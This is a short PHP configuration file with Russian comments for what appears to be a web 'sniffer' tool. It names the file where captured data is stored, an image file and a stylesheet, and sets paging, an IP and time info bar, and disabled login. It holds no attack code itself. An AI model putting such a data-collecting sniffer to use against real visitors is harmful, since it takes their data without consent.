<?
if (!defined("FILE")) die("Ошибка доступа.");

$data_filename = "data.txt";       // имя файла с данными сниффера
$image_filename = "i.gif";         // имя файла с рисунком
$style_filename = "style.css";     // имя файла со стилем

$max_entries = 0;           // лимит записей. впишите 0 для снятия лимита
$entries_on_page = 0;       // кол-во записей на одной странице (для всех пользователей)
                            // впишите 0, чтобы отключить постраничный вывод
$pages_pos = "updown";      // где располагать список страниц (при включенной пред. опции)
                            // возможные значения: "up" - вверху, "down" - внизу, "updown" - вверху и внизу
$info_line = true;          // показывать полосу информации в верху страницы (время, IP, ссылка "Обновить")

$auth_enabled = false;      // требуется авторизация
$user = "";                 // логин для входа
$password = "";             // пароль для входа
?>